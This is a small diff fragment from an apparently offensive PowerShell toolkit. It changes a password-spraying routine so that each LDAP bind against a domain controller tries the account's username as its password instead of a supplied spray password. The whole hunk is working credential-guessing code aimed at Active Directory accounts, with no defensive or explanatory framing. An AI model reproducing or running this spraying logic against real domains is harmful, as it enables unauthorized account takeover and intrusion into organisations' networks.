@@ -8257,7 +8257,7 @@ public class Natives
                             if ($DomainController) {
                               
                                 $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
-                                $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$DN", "$TargetDomain\$UserToSpray", "$SprayPassword")
+                                $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$DN", "$TargetDomain\$UserToSpray", "$UserToSpray")
                             }
                             
                             else {   
